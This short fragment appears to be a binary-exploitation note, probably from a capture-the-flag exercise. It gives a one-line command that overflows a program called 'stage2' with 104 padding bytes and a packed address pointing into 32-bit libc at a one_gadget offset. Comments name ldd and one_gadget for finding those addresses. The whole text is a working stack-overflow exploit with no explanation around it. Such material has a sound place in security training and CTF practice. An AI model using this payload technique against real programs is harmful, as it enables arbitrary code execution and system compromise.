./stage2 $(perl -e 'print "A"x104 . pack(l, (0xf7e02000 + 0x3ac5c))')

# ldd stage2
# one_gadget /lib/i386-linux-gnu/libc.so.6
